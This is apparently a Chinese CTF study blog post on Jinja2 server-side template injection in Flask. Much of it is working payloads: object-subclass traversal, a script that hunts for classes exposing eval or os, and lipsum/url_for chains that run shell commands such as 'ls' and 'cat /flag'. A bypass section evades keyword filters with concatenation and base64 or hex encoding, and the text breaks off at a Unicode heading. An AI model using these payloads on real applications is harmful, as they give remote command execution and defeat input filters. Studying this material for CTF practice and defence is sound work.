---
title: Flask-Jinja2
date: 2024-04-11 03:50:14
updated: 2025-11-13 05:29:00
tags:
  - Web
  - CTF
---
参考袁神笔记

总的利用思路: 通过获取object类的子类获取到各种方法，进而执行命令或者文件读写

## 获取object类

`object`类是所有对象的基类，故可以通过以下方法获取:

```python
''.__class__ # <type 'str'>
''.__class__.__bases__ # (<type 'object'>,)
''.__class__.__bases__[0] # <type 'object'>
```

对于字符串`''`,调用`__class__`方法可以获取它的类型，即`str`

再对`str`类型调用`__bases__`可以获取他的直接父类组成的元组

一般这个元组中的第一项即为`object`类

所以则有以下方式获取`object`类:

```python
().__class__.__bases__[0]
''.__class__.__bases__[0]
[].__class__.__bases__[0]
{}.__class__.__bases__[0]
0.__class__.__bases__[0]

().__class__.__base__ # __base__方法直接获取直接父类
''.__class__.__base__
[].__class__.__base__
{}.__class__.__base__
0.__class__.__base__

().__class__.__mro__[-1] # 获取类的调用顺序，最后一个调用的是object类
''.__class__.__mro__[-1]
[].__class__.__mro__[-1]
{}.__class__.__mro__[-1]
0.__class__.__mro__[-1]
```

## 获取object类的子类

在获取`object`类后，我们可以通过获取它的子类来获取很多类和方法:

```python
''.__class__.__bases__[0].__subclasses__()
# 输出:
# [<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'types.UnionType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class '_contextvars.Context'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Token'>, <class 'Token.MISSING'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '_distutils_hack._TrivialRe'>, <class '_distutils_hack.DistutilsMetaFinder'>, <class '_distutils_hack.shim'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'importlib._abc.Loader'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib.AsyncContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'ast.AST'>, <class 'enum.auto'>, <enum 'Enum'>, <class 'ast.NodeVisitor'>, <class 'dis.Bytecode'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'rlcompleter.Completer'>]
```

这样我们可以看到非常多的子类，我们需要做的就是在这些子类里找到有用的方法

可以这样得到一个更好查阅的枚举:

```python
for i in enumerate(''.__class__.__bases__[0].__subclasses__()):
    print(i)
# 输出:
# (0, <class 'type'>)
# (1, <class 'async_generator'>)
# (2, <class 'int'>)
# (3, <class 'bytearray_iterator'>)
# (4, <class 'bytearray'>)
# (5, <class 'bytes_iterator'>)
# (6, <class 'bytes'>)
# ...
```

这里有几百个子类，我们一般只寻找我们需要的

## 常用子类

我们可以通过以下方式寻找需要的包含某方法子类:

```python
# 获取基本字符串类的子类数量
sub_len = len(''.__class__.__base__.__subclasses__())
# 指定寻找的方法
func = 'eval'
# 遍历这些子类
for i in range(sub_len):
    try:
        # 获取子类的全局变量字典
        res = ''.__class__.__base__.__subclasses__()[i].__init__.__globals__
        # 检查是否包含方法
        for k in res:
            if func in str(k) or func in str(res[k]):
                # 如果找到含有方法的子类，打印该子类
                print(i, ': ', ''.__class__.__base__.__subclasses__()[i], " in ", str(k), sep='')
    except:
        # 忽略任何错误，并继续遍历
        pass
```

通过以下方法寻找包含某模块引用的子类:

```python
# 获取基本字符串类的子类数量
sub_len = len(''.__class__.__base__.__subclasses__())
# 指定寻找的模块
module = 'os.py'
# 遍历这些子类
for i in range(sub_len):
    try:
        # 获取子类的全局变量字典
        res = ''.__class__.__base__.__subclasses__()[i].__init__.__globals__
        # 检查是否包含模块
        for k in res:
            if module in str(k) or module in str(res[k]):
                # 如果找到含有方法的子类，打印该子类
                print(i, ': ', ''.__class__.__base__.__subclasses__()[i], " in ", str(k), sep='')
    except:
        # 忽略任何错误，并继续遍历
        pass
```
```python
import json
classes="""
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'pickle.PickleBuffer'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class 'Context'>, <class 'ContextVar'>, <class 'Token'>, <class 'Token.MISSING'>, <class 'moduledef'>, <class 'module'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc_data'>, <class 'abc.ABC'>, <class 'dict_itemiterator'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '__future__._Feature'>, <class 'operator.itemgetter'>, <class 'operator.attrgetter'>, <class 'operator.methodcaller'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'enum.auto'>, <enum 'Enum'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'typing._Final'>, <class 'typing._Immutable'>, <class 'typing.Generic'>, <class 'typing._TypingEmpty'>, <class 'typing._TypingEllipsis'>, <class 'typing.NamedTuple'>, <class 'typing.io'>, <class 'typing.re'>, <class '_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'select.poll'>, <class 'select.epoll'>, <class 'selectors.BaseSelector'>, <class '_socket.socket'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'socketserver.BaseServer'>, <class 'socketserver.ForkingMixIn'>, <class 'socketserver._NoThreads'>, <class 'socketserver.ThreadingMixIn'>, <class 'socketserver.BaseRequestHandler'>, <class 'datetime.date'>, <class 'datetime.timedelta'>, <class 'datetime.time'>, <class 'datetime.tzinfo'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_sha512.sha384'>, <class '_sha512.sha512'>, <class '_random.Random'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class 'Struct'>, <class 'unpack_iterator'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'email.charset.Charset'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class 'email._policybase._PolicyBase'>, <class 'email.feedparser.BufferedSubFile'>, <class 'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 'email.parser.BytesParser'>, <class 'email.message.Message'>, <class 'http.client.HTTPConnection'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, <class '_ssl.MemoryBIO'>, <class '_ssl.Session'>, <class 'ssl.SSLObject'>, <class 'mimetypes.MimeTypes'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class 'tokenize.Untokenizer'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class 'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'werkzeug._internal._Missing'>, <class '_ast.AST'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 'werkzeug.exceptions.Aborter'>, <class 'werkzeug.datastructures.mixins.ImmutableListMixin'>, <class 'werkzeug.datastructures.mixins.ImmutableDictMixin'>, <class 'werkzeug.datastructures.mixins.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.structures._omd_bucket'>, <class '_hashlib.HASH'>, <class '_blake2.blake2b'>, <class '_blake2.blake2s'>, <class '_sha3.sha3_224'>, <class '_sha3.sha3_256'>, <class '_sha3.sha3_384'>, <class '_sha3.sha3_512'>, <class '_sha3.shake_128'>, <class '_sha3.shake_256'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.SpooledTemporaryFile'>, <class 'tempfile.TemporaryDirectory'>, <class 'urllib.request.Request'>, <class 'urllib.request.OpenerDirector'>, <class 'urllib.request.BaseHandler'>, <class 'urllib.request.HTTPPasswordMgr'>, <class 'urllib.request.AbstractBasicAuthHandler'>, <class 'urllib.request.AbstractDigestAuthHandler'>, <class 'urllib.request.URLopener'>, <class 'urllib.request.ftpwrapper'>, <class 'werkzeug.datastructures.auth.Authorization'>, <class 'werkzeug.datastructures.auth.WWWAuthenticate'>, <class 'werkzeug.datastructures.file_storage.FileStorage'>, <class 'werkzeug.datastructures.headers.Headers'>, <class 'werkzeug.datastructures.range.IfRange'>, <class 'werkzeug.datastructures.range.Range'>, <class 'werkzeug.datastructures.range.ContentRange'>, <class 'dis.Bytecode'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'dataclasses._HAS_DEFAULT_FACTORY_CLASS'>, <class 'dataclasses._MISSING_TYPE'>, <class 'dataclasses._FIELD_BASE'>, <class 'dataclasses.InitVar'>, <class 'dataclasses.Field'>, <class 'dataclasses._DataclassParams'>, <class 'werkzeug.sansio.multipart.Event'>, <class 'werkzeug.sansio.multipart.MultipartDecoder'>, <class 'werkzeug.sansio.multipart.MultipartEncoder'>, <class 'importlib.abc.Finder'>, <class 'importlib.abc.Loader'>, <class 'importlib.abc.ResourceReader'>, <class 'pkgutil.ImpImporter'>, <class 'pkgutil.ImpLoader'>, <class 'hmac.HMAC'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.user_agent.UserAgent'>, <class 'werkzeug.sansio.request.Request'>, <class 'werkzeug.sansio.response.Response'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <class 'werkzeug.test.Cookie'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local._ProxyLookup'>, <class 'decimal.Decimal'>, <class 'decimal.Context'>, <class 'decimal.SignalDictMixin'>, <class 'decimal.ContextManager'>, <class 'numbers.Number'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class 'uuid.UUID'>, <class 'flask.json.provider.JSONProvider'>, <class 'gettext.NullTranslations'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.types.ParamType'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'werkzeug.routing.converters.BaseConverter'>, <class 'difflib.SequenceMatcher'>, <class 'difflib.Differ'>, <class 'difflib.HtmlDiff'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class 'ast.NodeVisitor'>, <class 'werkzeug.routing.rules.RulePart'>, <class 'werkzeug.routing.rules.RuleFactory'>, <class 'werkzeug.routing.rules.RuleTemplate'>, <class 'werkzeug.routing.matcher.State'>, <class 'werkzeug.routing.matcher.StateMachineMatcher'>, <class 'werkzeug.routing.map.Map'>, <class 'werkzeug.routing.map.MapAdapter'>, <class '_csv.Dialect'>, <class '_csv.reader'>, <class '_csv.writer'>, <class 'csv.Dialect'>, <class 'csv.DictReader'>, <class 'csv.DictWriter'>, <class 'csv.Sniffer'>, <class 'pathlib._Flavour'>, <class 'pathlib._Accessor'>, <class 'pathlib._Selector'>, <class 'pathlib._TerminatingSelector'>, <class 'pathlib.PurePath'>, <class 'zipfile.ZipInfo'>, <class 'zipfile.LZMACompressor'>, <class 'zipfile.LZMADecompressor'>, <class 'zipfile._SharedFile'>, <class 'zipfile._Tellable'>, <class 'zipfile.ZipFile'>, <class 'zipfile.Path'>, <class 'configparser.Interpolation'>, <class 'importlib.metadata.FileHash'>, <class 'importlib.metadata.Distribution'>, <class 'importlib.metadata.DistributionFinder.Context'>, <class 'importlib.metadata.FastPath'>, <class 'importlib.metadata.Prepared'>, <class 'blinker._saferef.BoundMethodWeakref'>, <class 'blinker._utilities._symbol'>, <class 'blinker._utilities.symbol'>, <class 'blinker._utilities.lazy_property'>, <class 'blinker.base.Signal'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class '_pickle.Unpickler'>, <class '_pickle.Pickler'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.nodes.Node'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContext'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <class 'flask.sansio.scaffold.Scaffold'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous.serializer.Serializer'>, <class 'itsdangerous._json._CompactJSON'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'flask.sansio.blueprints.BlueprintSetupState'>, <class 'unicodedata.UCD'>]
"""
num=0
alllist=[]
result=""
for i in classes:
    if i==">":
        result+=i
        alllist.append(result)
        result=""
    elif i=="\n" or i==",":
        continue
    else:
        result+=i
#寻找要找的类，并返回其索引
for k,v in enumerate(alllist):
    if "warnings.catch_warnings" in v:
        print(str(k)+"--->"+v)
#117---> <class 'warnings.catch_warnings'>
```

以下是一些常用子类:

```python
# 文件读取
<class 'file'> # 在Python3中移除
<class '_frozen_importlib_external.FileLoader'>

# 代码执行(eval)
<class 'os._wrap_close'>
<class 'warnings.WarningMessage'>
<class 'warnings.catch_warnings'>
<class 'codecs.IncrementalEncoder'>
<class 'codecs.IncrementalDecoder'>

# 命令执行(system()、popen())
<class 'os._wrap_close'>

# 库导入
<class '_frozen_importlib.BuiltinImporter'>
```

## 常用方法

### lipsum

jinja2里的`lipsum`方法,可以用于得到`__builtins__`其中有`eval`方法，而且`lipsum.__globals__`含有os模块

```python
lipsum.__globals__['os'].popen("ls").read()
lipsum.__globals__.get("os").popen("ls").read()
lipsum.__globals__.__builtins__['eval']("__import__('os').popen('ls /').read()")
```

### url\_for 和 get\_flashed\_messages

只有使用flask的渲染方法render\_template()和render\_template\_string()渲染时才可使用，用法如上

```python
url_for.__globals__['os'].popen("ls").read()
get_flashed_messages.__globals__.__builtins__['eval']("__import__("os").popen("ls /").read()")
```

## 调用方法

找到含有方法或模块的子类后，就可以调用方法执行操作

```python
# 对于方法
# 根据上面寻找的结果 例如<class 'os._wrap_close'> in __builtins__
# 说明eval方法在__buildins__中, 则:
''.__class__.__base__.__subclasses__()[212].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls /').read()")
# 对于os模块
# 根据上面的寻找结果，例如<class 'inspect.Parameter'> in os
# 则说明模块为对象, 则:
''.__class__.__base__.__subclasses__()[211].__init__.__globals__['os'].popen('ls').read()

                                                                (''.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__import__']('os')).popen('ls').read()
```

对以上调用的理解:

```python
# 获取空元组类（tuple类）
().__class__
# 获取空元组类的基类（object类）
().__class__.__base__
# 获取基类（object类）的子类列表
().__class__.__base__.__subclasses__()
# 从子类列表中获取索引为 212 的子类
().__class__.__base__.__subclasses__()[212]
# 获取索引为 212 的子类的 __init__ 方法
().__class__.__base__.__subclasses__()[212].__init__
# 获取索引为 212 的子类 __init__ 方法的全局变量字典
().__class__.__base__.__subclasses__()[212].__init__.__globals__
# 从全局变量字典中获取 '__builtins__' 对象
().__class__.__base__.__subclasses__()[212].__init__.__globals__['__builtins__']
# 从 '__builtins__' 对象中获取 'eval' 函数
().__class__.__base__.__subclasses__()[212].__init__.__globals__['__builtins__']['eval']
# 使用 'eval' 函数执行字符串中的代码 "print(1+1)"
().__class__.__base__.__subclasses__()[212].__init__.__globals__['__builtins__']['eval']("print(1+1)")

# 获取字符串类（str类）
''.__class__
# 获取字符串类的基类（object类）
''.__class__.__base__
# 获取基类（object类）的子类列表
''.__class__.__base__.__subclasses__()
# 从子类列表中获取索引为 211 的子类
''.__class__.__base__.__subclasses__()[211]
# 获取索引为 211 的子类的 __init__ 方法
''.__class__.__base__.__subclasses__()[211].__init__
# 获取索引为 211 的子类 __init__ 方法的全局变量字典
''.__class__.__base__.__subclasses__()[211].__init__.__globals__
# 从全局变量字典中获取 'os' 模块
''.__class__.__base__.__subclasses__()[211].__init__.__globals__['os']
# 使用 'os' 模块的 popen() 函数执行 'ls' 命令
''.__class__.__base__.__subclasses__()[211].__init__.__globals__['os'].popen('ls')
# 读取 'ls' 命令的输出结果
''.__class__.__base__.__subclasses__()[211].__init__.__globals__['os'].popen('ls').read()
```

## Jinja2 SSTI Bypass

### 关键字绕过:

```python
# 字符串拼接
# 例如过滤flag、os、class、subclasses、popen

## 使用 + 连接字符串(在URL中需要编码，使用%2B)
''.__class__.__base__.__subclasses__()[211].__init__.__globals__['o' + 's'].popen('cat /fl' + 'ag').read()
## 使用引号拼接
''.__class__.__base__.__subclasses__()[211].__init__.__globals__['o''s'].popen('cat /fl''ag').read()
()['__cla''ss__'].__bases__[0]['__subcl''asses__']()
lipsum.__globals__['o''s']['pop''en']("ls").read()
## 使用~拼接
''.__class__.__base__.__subclasses__()[211].__init__.__globals__['o'~'s'].popen('cat /fl'~'ag').read()
    

# 编码绕过

## 使用Base64
().__class__.__base__.__subclasses__()[59].__init__.__globals__['X19idWlsdGluc19f'.decode('base64')]['ZXZhbA=='.decode('base64')]('X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='.decode('base64'))
### 相当于().__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')

## 使用Hex编码
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x65\x76\x61\x6c']('__import__("os").popen("ls /").read()')
### 相当于().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')

## 使用Unicode编码
